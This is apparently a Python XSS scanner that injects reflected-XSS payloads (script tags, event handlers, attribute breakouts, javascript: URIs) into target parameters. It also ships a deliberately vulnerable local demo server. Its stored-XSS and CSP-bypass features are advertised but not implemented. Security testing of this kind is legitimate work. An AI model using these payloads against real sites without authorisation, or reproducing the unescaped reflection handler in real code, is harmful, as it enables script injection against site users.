#!/usr/bin/env python3
"""
WEB2 — XSS Scanner + Payload Generator
Reflected, Stored, and DOM-based XSS detection with CSP bypass payloads.
Uses stdlib urllib for HTTP.
"""

import argparse
import sys
import time
import random
import string
import re
import json
import urllib.parse
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class XSSType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"


@dataclass
class ScanResult:
    url: str
    parameter: str
    xss_type: XSSType
    payload: str
    context: str
    evidence: str = ""
    csp_bypass: bool = False


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    timeout: int = 10
    delay: float = 0.0
    level: int = 1
    encode: str = "none"
    verbose: bool = False
    test_stored: bool = False
    check_csp: bool = False


MARKER = "xSs" + "".join(random.choices(string.ascii_uppercase, k=6))
MARKER_RE = re.compile(re.escape(MARKER), re.IGNORECASE)

XSS_PAYLOADS = {
    "basic": [
        f"<script>alert('{MARKER}')</script>",
        f"<img src=x onerror=alert('{MARKER}')>",
        f"<svg onload=alert('{MARKER}')>",
        f"<body onload=alert('{MARKER}')>",
        f"<iframe src=\"javascript:alert('{MARKER}')\">",
    ],
    "event_handler": [
        f"\" onmouseover=\"alert('{MARKER}')\"",
        f"' onmouseover='alert(\"{MARKER}\")' ",
        f"\" onfocus=\"alert('{MARKER}')\" autofocus=\"",
    ],
    "attribute_breakout": [
        f"\"><script>alert('{MARKER}')</script>",
        f"'><script>alert('{MARKER}')</script>",
        f"\"><img src=x onerror=alert('{MARKER}')>",
        f"'><img src=x onerror=alert('{MARKER}')>",
    ],
    "javascript_protocol": [
        f"javascript:alert('{MARKER}')",
        f"data:text/html,<script>alert('{MARKER}')</script>",
    ],
    "html_injection": [
        f"<h1>{MARKER}</h1>",
        f"<marquee>{MARKER}</marquee>",
        f"<details open ontoggle=alert('{MARKER}')>",
    ],
}

DOM_XSS_SOURCES = [
    "document.URL", "document.documentURI", "location.hash",
    "location.search", "document.referrer", "window.name",
]

DOM_XSS_SINKS = [
    "eval(", "setTimeout(", "document.write(", ".innerHTML",
    ".outerHTML", "document.location", "window.location",
]

CSP_BYPASS_PAYLOADS = [
    f"<script>alert('{MARKER}')</script>",
    f"<img src=x onerror=alert('{MARKER}')>",
    f"<svg/onload=alert('{MARKER}')>",
    f"<details open ontoggle=alert('{MARKER}')>",
    f"<iframe src=\"data:text/html,<script>alert('{MARKER}')</script>\">",
    f"<input onfocus=alert('{MARKER}') autofocus>",
]


def print_banner():
    print("""
  +-----------------------------------------------+
  |     WEB2 -- XSS Scanner + Payload Generator   |
  |         Reflected / Stored / DOM XSS          |
  +-----------------------------------------------+
""")


def encode_payload(payload: str, encoding: str) -> str:
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "html":
        return ''.join(f"&#{ord(c)};" for c in payload)
    elif encoding == "unicode":
        return ''.join(f"\\u{ord(c):04x}" for c in payload)
    elif encoding == "base64":
        import base64
        return base64.b64encode(payload.encode()).decode()
    return payload


class XSSScanner:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.results: list = []
        self.csp_headers: dict = {}

    def _request(self, url: str, method: str = "GET", data: dict = None) -> tuple:
        try:
            if method.upper() == "POST" and data:
                encoded = urllib.parse.urlencode(data).encode("utf-8")
                req = urllib.request.Request(url, data=encoded, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
            else:
                req = urllib.request.Request(url, method="GET")

            for k, v in self.config.headers.items():
                req.add_header(k, v)
            if self.config.cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in self.config.cookies.items())
                req.add_header("Cookie", cookie_str)

            resp = urllib.request.urlopen(req, timeout=self.config.timeout)
            return resp.read().decode("utf-8", errors="replace"), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.read().decode("utf-8", errors="replace"), dict(e.headers)
        except Exception:
            return "", {}

    def _build_url(self, base_url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _build_data(self, param: str, value: str) -> dict:
        data = dict(self.config.data)
        data[param] = value
        return data

    def detect_parameters(self) -> list:
        parsed = urllib.parse.urlparse(self.config.url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            return list(params.keys())
        if self.config.data:
            return list(self.config.data.keys())
        return []

    def detect_context(self, response_text: str, marker: str) -> str:
        if re.search(r"<script[^>]*>.*?" + re.escape(marker), response_text, re.DOTALL | re.IGNORECASE):
            return "javascript"
        if re.search(r"<" + re.escape(marker) + r"[^>]*>", response_text, re.IGNORECASE):
            return "html"
        if re.search(re.escape(marker), response_text):
            return "html"
        return "unknown"

    def test_reflected(self, url: str, param: str) -> list:
        results = []
        all_payloads = list(XSS_PAYLOADS["basic"]) + list(XSS_PAYLOADS["attribute_breakout"])
        for payload in all_payloads:
            encoded = encode_payload(payload, self.config.encode)
            if self.config.method.upper() == "POST":
                data = self._build_data(param, encoded)
                response_text, headers = self._request(url, "POST", data)
            else:
                test_url = self._build_url(url, param, encoded)
                response_text, headers = self._request(test_url)

            # Detect RAW (unencoded) reflection: the payload must appear
            # verbatim in the response. HTML-encoded output will not match.
            if payload in response_text and MARKER_RE.search(response_text):
                context = self.detect_context(response_text, MARKER)
                results.append(ScanResult(
                    url=url, parameter=param, xss_type=XSSType.REFLECTED,
                    payload=payload, context=context,
                    evidence="Raw payload reflected unencoded in response",
                ))
                if self.config.verbose:
                    print(f"  [+] Reflected XSS: param={param}, context={context}")
                if not self.config.verbose:
                    break
        return results

    def analyze_dom(self, url: str) -> list:
        results = []
        response_text, _ = self._request(url)
        if not response_text:
            return results
        found_sources = [s for s in DOM_XSS_SOURCES if s in response_text]
        found_sinks = [s for s in DOM_XSS_SINKS if s in response_text]
        if found_sources and found_sinks:
            results.append(ScanResult(
                url=url, parameter="DOM", xss_type=XSSType.DOM_BASED,
                payload="N/A", context="dom",
                evidence=f"Sources: {', '.join(found_sources[:3])} | Sinks: {', '.join(found_sinks[:3])}",
            ))
        return results

    def run_scan(self):
        print(f"[*] Target: {self.config.url}")
        print(f"[*] Method: {self.config.method}")
        print(f"[*] Marker: {MARKER}\n")

        parameters = self.detect_parameters()

        if self.config.level >= 2:
            print(f"[*] Analyzing DOM sources and sinks...")
            self.results.extend(self.analyze_dom(self.config.url))

        if not parameters:
            print("[!] No parameters found to test")
            return
        print(f"[*] Parameters to test: {parameters}\n")

        for param in parameters:
            print(f"[*] Testing parameter: {param}")
            self.results.extend(self.test_reflected(self.config.url, param))

    def print_results(self):
        print("\n" + "=" * 60)
        print("  SCAN RESULTS")
        print("=" * 60)
        if not self.results:
            print("\n  No XSS vulnerabilities found.\n")
            return
        by_type = {}
        for r in self.results:
            by_type.setdefault(r.xss_type.value, []).append(r)
        for xss_type, results in by_type.items():
            print(f"\n  --- {xss_type.upper()} XSS ({len(results)} found) ---")
            for i, r in enumerate(results, 1):
                print(f"  [{i}] Parameter: {r.parameter}")
                print(f"      Context:  {r.context}")
                print(f"      Payload:  {r.payload[:70]}")
                if r.evidence:
                    print(f"      Evidence: {r.evidence[:80]}")
        print(f"\n  Total vulnerabilities: {len(self.results)}")
        print("=" * 60)

    def export_results(self, filename: str):
        data = [{
            "url": r.url, "parameter": r.parameter, "xss_type": r.xss_type.value,
            "payload": r.payload, "context": r.context, "evidence": r.evidence,
        } for r in self.results]
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[*] Results exported to {filename}")


def main():
    parser = argparse.ArgumentParser(
        description="WEB2 -- XSS Scanner + Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://target.com/search?q=test"
  %(prog)s -u "http://target.com/comment" -m POST -d "text=hello"
  %(prog)s -u "http://target.com/page?q=test" --level 2 -o results.json
  %(prog)s --demo
        """,
    )
    parser.add_argument("-u", "--url", help="Target URL with parameter")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", default="", help="POST data (key=value&key2=value2)")
    parser.add_argument("-c", "--cookies", default="", help="Cookies")
    parser.add_argument("--header", action="append", default=[])
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--level", type=int, default=1, choices=[1, 2, 3])
    parser.add_argument("--encode", choices=["none", "url", "double_url", "html", "unicode", "base64"], default="none")
    parser.add_argument("--stored", action="store_true")
    parser.add_argument("--check-csp", action="store_true")
    parser.add_argument("-o", "--output", help="Export results to JSON")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--demo", action="store_true", help="Run offline demo against vulnerable simulator")
    args = parser.parse_args()

    if args.demo:
        run_demo()
        return

    if not args.url:
        parser.error("--url is required (or use --demo)")

    print_banner()
    data = {}
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                data[k] = v
    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()
    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    config = ScanConfig(
        url=args.url, method=args.method, data=data, cookies=cookies,
        headers=headers, timeout=args.timeout, delay=args.delay,
        level=args.level, encode=args.encode, verbose=args.verbose,
        test_stored=args.stored, check_csp=args.check_csp,
    )
    scanner = XSSScanner(config)
    try:
        scanner.run_scan()
        scanner.print_results()
        if args.output:
            scanner.export_results(args.output)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)


def run_demo():
    """Offline demo: vulnerable simulator reflects raw, unencoded input."""
    import threading
    from http.server import HTTPServer, BaseHTTPRequestHandler

    class VulnHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            import html as html_mod
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            q = params.get("q", [""])[0]
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            # VULNERABLE: reflects raw (unencoded) input into HTML body
            body = f"<html><body><h1>Search Results</h1><p>You searched for: {q}</p></body></html>"
            self.wfile.write(body.encode())

        def log_message(self, format, *args):
            pass

    class CleanHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            import html as html_mod
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            q = params.get("q", [""])[0]
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            # SAFE: HTML-encodes the input
            body = f"<html><body><h1>Search Results</h1><p>You searched for: {html_mod.escape(q)}</p></body></html>"
            self.wfile.write(body.encode())

        def log_message(self, format, *args):
            pass

    port = 18002
    vuln_server = HTTPServer(("127.0.0.1", port), VulnHandler)
    t = threading.Thread(target=vuln_server.serve_forever, daemon=True)
    t.start()

    print_banner()
    print(f"[*] DEMO MODE: Starting vulnerable target simulator on 127.0.0.1:{port}")
    print("[*] The simulator intentionally reflects raw, unencoded input.\n")

    config = ScanConfig(
        url=f"http://127.0.0.1:{port}/search?q=test",
        method="GET", timeout=5, verbose=True,
    )
    scanner = XSSScanner(config)
    scanner.run_scan()
    scanner.print_results()

    found_reflected = any(r.xss_type == XSSType.REFLECTED for r in scanner.results)
    vuln_server.shutdown()

    if found_reflected:
        print("\n[+] Demo: reflected XSS detected on simulator (expected behavior).")
        print("[+] Exit 0 -- scanner works correctly.")
        sys.exit(0)
    else:
        print("\n[-] Demo: No XSS found -- scanner may need tuning.")
        sys.exit(1)


if __name__ == "__main__":
    main()